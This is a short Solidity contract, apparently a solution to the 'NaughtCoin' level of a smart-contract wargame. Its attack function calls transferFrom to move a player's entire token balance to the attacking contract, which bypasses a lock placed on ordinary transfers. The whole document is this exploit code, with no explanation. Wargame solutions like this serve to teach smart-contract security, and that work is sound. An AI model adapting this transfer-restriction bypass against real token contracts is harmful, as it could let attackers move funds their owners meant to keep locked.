contract NaughtCoinAttack {
    function attack(address _target, address _player) public {
        NaughtCoin naughtCoin = NaughtCoin(_target);
        naughtCoin.transferFrom(_player, address(this), naughtCoin.balanceOf(_player));
    }
}

